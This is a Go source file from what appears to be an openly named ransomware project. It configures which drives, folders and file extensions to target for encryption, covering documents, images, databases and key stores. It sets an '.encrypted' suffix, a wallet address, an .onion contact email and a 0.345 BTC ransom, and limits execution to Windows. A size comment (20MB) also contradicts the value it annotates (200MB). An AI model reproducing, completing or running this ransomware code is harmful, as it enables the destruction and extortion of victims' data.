package cmd

import (
	"fmt"
	"log"
	"os"
	"runtime"
	"sync"

	"github.com/j0nk0/ransomware/cryptofs"
	"github.com/j0nk0/ransomware/utils"
)

var (
	UserDir = fmt.Sprintf("%s\\", utils.GetCurrentUser().HomeDir)

	// Temp Dir
	TempDir = fmt.Sprintf("%s\\", os.Getenv("TEMP"))

	// Directories to walk searching for files
	// By default it will walk throught all available drives
	InterestingDirs = utils.GetDrives()

	// Folders to skip
	SkippedDirs = []string{
		"ProgramData",
		"Windows",
		"bootmgr",
		"$WINDOWS.~BT",
		"Windows.old",
		"Temp",
		"tmp",
		"Program Files",
		"Program Files (x86)",
		"AppData",
		"$Recycle.Bin",
	}

	// Interesting extensions to match files
	InterestingExtensions = []string{
         "3dm", "3ds", "3g2", "3gp", "aac", "abc", "accdb", "ai", "aif", "aiff", "amfs", "ape", "asf", "asx", "avi", "bak", "bin",
         "bkp", "bks", "blend", "bmp", "bz2", "c", "cacerts", "cbrz", "cbrz7t", "cc", "cer", "cert", "cfg", "chm", "CHMgz", "class",
         "cmf", "conf", "crl", "crt", "csr", "csv", "ctsv", "dat", "db", "dbf", "dbj", "dbsm", "dem", "divx", "djvu", "dmf", "doc", 
         "docmx", "docx", "dotmx", "dtx", "dvi", "DVIgz", "eps", "epub", "far", "fb2", "fdfgz", "fits", "fl", "flac", "fli", "flv", 
         "fodp", "fods", "fodt", "fxm", "g18", "g3", "gam", "gif", "gkr", "go", "gr36", "gz", "htm", "html", "ico", "iif", "indd", 
         "ini", "ins", "iso", "it", "java", "jceks", "jks", "jpeg", "jpg", "js", "ks", "latex", "ltx", "lua", "lzma", "m2ts", "m3u", 
         "m4a", "m4abp", "m4pv", "m4v", "max", "mdb", "mdl", "meod", "mid", "midi", "miff", "mkv", "mng", "mobi", "mod", "mov", "mp234", 
         "mp234c", "mp3", "mp4", "mpa", "mpeg", "mpg", "msg", "mt2m", "nes", "obj", "odm", "odt", "ogag", "ogagmvx", "ogg", "okta", "okular", 
         "otp", "ots", "ott", "p10", "p12", "p7b", "pbgpm", "pct", "pcx", "pdb", "pdf", "PDFgz", "pem", "pes", "pfdf", "pfx", "php", 
         "pkipath", "pls", "pm", "png", "pngm", "potmx", "pps", "ppsx", "ppt", "pptmx", "pptx", "prf", "ps", "psd", "pstm", "py", "qt", 
         "ram", "rcp", "rgb", "rle", "rm", "rmi", "rmj", "rom", "rspm", "rtf", "s3tm", "sav", "sgl", "smil", "so", "soconf", "spx", "sql", 
         "sqlite", "srt", "stc", "sti", "stw", "svg", "sxc", "sxg", "sxi", "sxw", "texi", "tga", "tgz", "tif", "tiff", "tlz", "tmp", "tps", 
         "tta", "txt", "ubr", "ult", "umx", "vcd", "VDRpart", "viv", "vob", "wav", "wma", "wmv", "wpd", "wps", "x3m", "xbpm", "xlr", "xls", 
         "xlsbmx", "xlsx", "xltmx", "xlw", "xm", "xpm", "xps", "xwd", "xz", "yuv", "zip",
	}

	// Max size allowed to match a file, 20MB by default
	MaxFileSize = int64(200 * 1e+6)

	// Indexer index files and control goroutines execution
	Indexer = struct {
		Files chan *cryptofs.File
		sync.WaitGroup
	}{
		Files: make(chan *cryptofs.File),
	}

	// The logger instance
	Logger = func() *log.Logger {
		// The default destination is os.Stderr, but you can set any io.Writer
		// as the log output. Use ioutil.Discard to ignore the log output
		//
		// Example with a file:
		// f, err := os.OpenFile(TempDir+"example.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0600)
		// handle error...
		// return log.New(f, "optional prefix", log.LstdFlags)
		//
		return log.New(os.Stderr, "", log.LstdFlags)
	}()

	// Workers processing the files
	NumWorkers = runtime.NumCPU()

	// Extension appended to files after encryption
	EncryptionExtension = ".encrypted"

	// Your wallet address
	Wallet = "FD0AhH61ona6fXS62RSQKhNF07Ijx5SBQO"

	// Your contact email
	ContactEmail = "example@ywtpdnpwihbyuvck.onion"

	// The ransom to pay
	Price = "0.345 BTC"
)

// Execute only on windows
func CheckOS() {
	if runtime.GOOS != "windows" {
		Logger.Fatalln("Sorry, but your OS is currently not supported. Try again with a windows machine")
	}
}
